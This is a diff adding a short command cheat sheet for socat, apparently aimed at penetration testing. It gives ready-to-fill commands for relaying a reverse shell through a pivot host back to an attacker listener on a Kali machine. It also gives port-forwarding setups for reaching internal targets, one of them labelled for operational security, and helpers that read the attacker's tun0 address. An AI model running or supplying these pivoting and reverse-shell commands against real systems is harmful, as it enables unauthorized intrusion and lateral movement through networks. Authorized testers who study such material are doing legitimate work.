@@ -1,0 +1,16 @@
+% socat
+
+# reverse shell relay
+sudo nc -lvnp <LPORT>
+./socat tcp-l:<ANY_PIVOT_LPORT> tcp:<LHOST>:<LPORT> &
+
+# port forward - EASY
+./socat tcp-l:<ANY_PIVOT_LPORT>,fork,reuseaddr tcp:<TARGET_IP>:<TARGET_PORT> &
+
+# port forward - OPSEC (LPORT1=SEND; LPORT2=RECV)
+socat tcp-l:<LPORT1> tcp-l:<LPORT2>,fork,reuseaddr &
+./socat tcp:<KALI_IP>:<LPORT1> tcp:<TARGET_IP>:<TARGET_PORT>,fork &
+curl localhost:<LPORT2>
+
+$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
+$ KALI_IP: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
